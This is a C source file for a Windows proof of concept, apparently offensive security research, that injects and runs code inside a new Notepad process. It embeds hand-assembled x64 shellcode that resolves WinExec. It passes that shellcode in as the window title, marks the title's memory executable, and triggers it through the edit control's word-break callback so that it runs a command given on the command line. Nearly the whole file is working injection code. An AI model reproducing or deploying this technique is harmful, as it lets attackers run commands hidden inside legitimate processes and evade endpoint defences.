/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/util.h"

// get the address of window title
PVOID get_win_text(HANDLE hp, PDWORD textlen) {
    NTSTATUS                    nts;
    PROCESS_BASIC_INFORMATION   pbi;
    RTL_USER_PROCESS_PARAMETERS upp;
    PEB                         peb;
    ULONG                       len;
    SIZE_T                      rd;

    // get the address of PEB
    nts = NtQueryInformationProcess(
        hp, ProcessBasicInformation,
        &pbi, sizeof(pbi), &len);
    
    // get the address RTL_USER_PROCESS_PARAMETERS
    ReadProcessMemory(
      hp, pbi.PebBaseAddress,
      &peb, sizeof(PEB), &rd);
    
    // get the address of window title
    ReadProcessMemory(
      hp, peb.ProcessParameters,
      &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);

    *textlen = upp.WindowTitle.Length;
    return upp.WindowTitle.Buffer;
}

#define WINEXEC_SIZE 197

char WINEXEC[] = {
  /* 0000 */ "\x56"                     /* push      rsi                           */
  /* 0001 */ "\x53"                     /* push      rbx                           */
  /* 0002 */ "\x57"                     /* push      rdi                           */
  /* 0003 */ "\x55"                     /* push      rbp                           */
  /* 0004 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0006 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 0008 */ "\x48\x29\xc4"             /* sub       rsp, rax                      */
  /* 000B */ "\x51"                     /* push      rcx                           */
  /* 000C */ "\x6a\x60"                 /* push      0x60                          */
  /* 000E */ "\x41\x5b"                 /* pop       r11                           */
  /* 0010 */ "\x65\x49\x8b\x03"         /* mov       rax, qword gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"         /* mov       rax, qword [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                 /* jmp       0x21                          */
  /* 001E */ "\x48\x8b\x3f"             /* mov       rdi, qword [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword [rdi + 0x30]       */
  /* 0025 */ "\x8b\x73\x3c"             /* mov       esi, dword [rbx + 0x3c]       */
  /* 0028 */ "\x44\x01\xde"             /* add       esi, r11d                     */
  /* 002B */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword [rbx + rsi + 0x28] */
  /* 002F */ "\x67\xe3\xec"             /* jecxz     0x1e                          */
  /* 0032 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword [rbx + rcx + 0x18] */
  /* 0037 */ "\xad"                     /* lodsd                                   */
  /* 0038 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 0039 */ "\x67\xe3\xe2"             /* jecxz     0x1e                          */
  /* 003C */ "\xad"                     /* lodsd                                   */
  /* 003D */ "\x41\x90"                 /* xchg      eax, r8d                      */
  /* 003F */ "\x49\x01\xd8"             /* add       r8, rbx                       */
  /* 0042 */ "\xad"                     /* lodsd                                   */
  /* 0043 */ "\x95"                     /* xchg      eax, ebp                      */
  /* 0044 */ "\x48\x01\xdd"             /* add       rbp, rbx                      */
  /* 0047 */ "\xad"                     /* lodsd                                   */
  /* 0048 */ "\x41\x91"                 /* xchg      eax, r9d                      */
  /* 004A */ "\x49\x01\xd9"             /* add       r9, rbx                       */
  /* 004D */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword [rbp + rcx*4 - 4]  */
  /* 0051 */ "\x48\x01\xde"             /* add       rsi, rbx                      */
  /* 0054 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0056 */ "\x99"                     /* cdq                                     */
  /* 0057 */ "\xac"                     /* lodsb                                   */
  /* 0058 */ "\x01\xc2"                 /* add       edx, eax                      */
  /* 005A */ "\xc1\xca\x08"             /* ror       edx, 8                        */
  /* 005D */ "\xfe\xc8"                 /* dec       al                            */
  /* 005F */ "\x79\xf6"                 /* jns       0x57                          */
  /* 0061 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47               */
  /* 0067 */ "\xe0\xe4"                 /* loopne    0x4d                          */
  /* 0069 */ "\x75\xb3"                 /* jne       0x1e                          */
  /* 006B */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word [r9 + rcx*2]        */
  /* 0070 */ "\x41\x8b\x04\x80"         /* mov       eax, dword [r8 + rax*4]       */
  /* 0074 */ "\x48\x01\xc3"             /* add       rbx, rax                      */
  /* 0077 */ "\x5a"                     /* pop       rdx                           */
  /* 0078 */ "\x4d\x31\xc0"             /* xor       r8, r8                        */
  /* 007B */ "\x4d\x31\xc9"             /* xor       r9, r9                        */
  /* 007E */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0080 */ "\x48\x89\x44\x24\x20"     /* mov       qword [rsp + 0x20], rax       */
  /* 0085 */ "\x48\x89\x44\x24\x28"     /* mov       qword [rsp + 0x28], rax       */
  /* 008A */ "\x48\x89\x44\x24\x30"     /* mov       qword [rsp + 0x30], rax       */
  /* 008F */ "\x48\x89\x44\x24\x38"     /* mov       qword [rsp + 0x38], rax       */
  /* 0094 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword [rsp + 0x50]       */
  /* 0099 */ "\x48\x89\x7c\x24\x48"     /* mov       qword [rsp + 0x48], rdi       */
  /* 009E */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword [rsp + 0x60]       */
  /* 00A3 */ "\x48\x89\x7c\x24\x40"     /* mov       qword [rsp + 0x40], rdi       */
  /* 00A8 */ "\x31\xc9"                 /* xor       ecx, ecx                      */
  /* 00AA */ "\x6a\x68"                 /* push      0x68                          */
  /* 00AC */ "\x58"                     /* pop       rax                           */
  /* 00AD */ "\xab"                     /* stosd                                   */
  /* 00AE */ "\x48\x83\xe8\x04"         /* sub       rax, 4                        */
  /* 00B2 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 00B3 */ "\xf3\xaa"                 /* rep       stosb                         */
  /* 00B5 */ "\xff\xd3"                 /* call      rbx                           */
  /* 00B7 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00B9 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 00BB */ "\x48\x01\xc4"             /* add       rsp, rax                      */
  /* 00BE */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00C0 */ "\x5d"                     /* pop       rbp                           */
  /* 00C1 */ "\x5f"                     /* pop       rdi                           */
  /* 00C2 */ "\x5b"                     /* pop       rbx                           */
  /* 00C3 */ "\x5e"                     /* pop       rsi                           */
  /* 00C4 */ "\xc3"                     /* ret                                     */
};

#define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"

void win_text_inject(PWCHAR cmd) {
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    WCHAR               path[MAX_PATH]={0};    
    INT                 i; 
    PVOID               va;
    DWORD               rva, old, len;
    PVOID               win_title;
    HWND                npw, ecw;

    ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
    
    // create a new process using shellcode as window title
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWDEFAULT;
    si.lpTitle     = (PWCHAR)WINEXEC;
    
    if(!CreateProcess(path, NULL, NULL, NULL, 
      FALSE, 0, NULL, NULL, &si, &pi))
    {
      xstrerror(L"CreateProcess");
      goto cleanup;
    }
     
    // wait for process to initialize
    // if you don't wait, there can be a race condition
    // reading the correct window title address from new process  
    WaitForInputIdle(pi.hProcess, INFINITE);
    
    // the command to execute is just pasted into the notepad
    // edit control.
    npw = FindWindow(L"Notepad", NULL);
    ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
    SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
    
    // get the address of window title in new process
    // which contains our shellcode
    win_title = get_win_text(pi.hProcess, &len);
    
    // set the window title address to RWX
    if(!VirtualProtectEx(pi.hProcess, win_title, 
      len, PAGE_EXECUTE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RWX)");
      goto cleanup;
    }
    
    // execute shellcode
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)win_title);
    SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
    
    // set window title address to RW
    if(!VirtualProtectEx(pi.hProcess, win_title, 
      len, PAGE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RW)");
    }
cleanup:

    if(pi.hProcess != NULL) {
      //TerminateProcess(pi.hProcess, 0);
      CloseHandle(pi.hThread);
      CloseHandle(pi.hProcess);
    }
}

int main(void) {
    WCHAR **argv;
    int   argc;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if(argc != 2) {
      printf("usage: win_inject <command>\n");
      return 0;
    }
    
    win_text_inject(argv[1]);
    
    return 0;
}
